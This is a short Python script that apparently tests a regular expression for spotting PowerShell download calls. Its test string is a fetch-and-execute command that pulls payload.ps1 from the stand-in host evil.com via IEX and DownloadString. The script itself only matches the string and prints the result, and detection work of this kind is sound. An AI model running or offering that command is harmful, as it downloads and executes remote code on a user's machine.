import re
pattern = r'(DownloadString|DownloadFile)\s*\('
test = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.com/payload.ps1")'
match = re.search(pattern, test, re.IGNORECASE)
print('Match:', match)
if match:
    print('Group:', match.group())